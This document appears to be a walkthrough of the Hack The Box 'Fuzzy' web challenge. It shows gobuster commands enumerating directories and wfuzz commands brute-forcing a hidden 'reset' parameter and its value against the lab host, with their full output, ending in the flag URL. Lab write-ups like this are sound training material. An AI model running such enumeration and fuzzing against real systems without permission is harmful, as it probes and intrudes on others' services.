# Fuzzy (Hack The Box) (Web-app Challenge)

## 1. Access to the website

![](http://sarthaksaini.com/2019/June/web-app/fuzzy-htb/Selection_007.png)

## 2. List the directries

Let's list the directries by gobuster.
I used the wordlist in the Kali linux.

command:
```
gobuster dir -u http://docker.hackthebox.eu:42566/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -t 50 -x php,txt,html,htm
```

result:
```
$ gobuster dir -u http://docker.hackthebox.eu:42566/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -t 50 -x php,txt,html,htm

=====================================================
Gobuster v2.0.1              OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://docker.hackthebox.eu:42566/
[+] Threads      : 50
[+] Wordlist     : /usr/share/dirbuster/directory-list-2.3-medium.txt
[+] Status codes : 200,204,301,302,307,403
[+] Extensions   : htm,php,txt,html
[+] Timeout      : 10s
=====================================================
2019/07/11 00:48:35 Starting gobuster
=====================================================
/index.html (Status: 200)
/css (Status: 301)
/js (Status: 301)
/api (Status: 301)
```
We can find interesting directory called `api`.

## 3. Check "api" directory

command:
```
gobuster dir -u http://docker.hackthebox.eu:42566/api/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -t 50 -x php,txt,html,htm
```

result:
```
$ gobuster dir -u http://docker.hackthebox.eu:42566/api/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -t 50 -x php,txt,html,htm

=====================================================
Gobuster v2.0.1              OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://docker.hackthebox.eu:42566/api/
[+] Threads      : 50
[+] Wordlist     : /usr/share/dirbuster/directory-list-2.3-medium.txt
[+] Status codes : 200,204,301,302,307,403
[+] Extensions   : php,txt,html,htm
[+] Timeout      : 10s
=====================================================
2019/07/11 00:50:53 Starting gobuster
=====================================================
/index.html (Status: 200)
/action.php (Status: 200)
```

So, we foud the `action.php`.

## 4. What is on action.php?

![](http://sarthaksaini.com/2019/June/web-app/fuzzy-htb/Selection_008.png)

It requires paramter.

## 5. Finding the parameter

command:
```
wfuzz --hh=24 -c  -w /usr/share/dirb/wordlists/big.txt http://docker.hackthebox.eu:42566/api/action.php?FUZZ=test
```

result:
```
$ wfuzz --hh=24 -c  -w /usr/share/dirb/wordlists/big.txt http://docker.hackthebox.eu:42566/api/action.php?FUZZ=test 
********************************************************
* Wfuzz 2.4 - The Web Fuzzer                           *
********************************************************

Target: http://docker.hackthebox.eu:42566/api/action.php?FUZZ=test
Total requests: 20469

===================================================================
ID           Response   Lines    Word     Chars       Payload                                                               
===================================================================

000015356:   200        0 L      5 W      27 Ch       "reset"                                                               

Total time: 399.9509
Processed Requests: 20469
Filtered Requests: 20468
Requests/sec.: 51.17877
```

We found our parameter which is `reset`.
Let's post reset with some random value.

## 6. Finsing the ID 

It resturns the message below.

![](http://sarthaksaini.com/2019/June/web-app/fuzzy-htb/Selection_009.png)

command:
```
wfuzz --hh=27 -c  -w /usr/share/dirb/wordlists/big.txt http://docker.hackthebox.eu:42566/api/action.php?reset=FUZZ
```

result:
```
$ wfuzz --hh=27 -c  -w /usr/share/dirb/wordlists/big.txt http://docker.hackthebox.eu:42566/api/action.php?reset=FUZZ
********************************************************
* Wfuzz 2.4 - The Web Fuzzer                           *
********************************************************

Target: http://docker.hackthebox.eu:42566/api/action.php?reset=FUZZ
Total requests: 20469

===================================================================
ID           Response   Lines    Word     Chars       Payload                                                               
===================================================================

000000318:   200        0 L      10 W     74 Ch       "20"
```

### 7. You got the flag!

Access to the URL with the correct parameter.
```
URL:-http://docker.hackthebox.eu:42566/api/action.php?reset=20
```

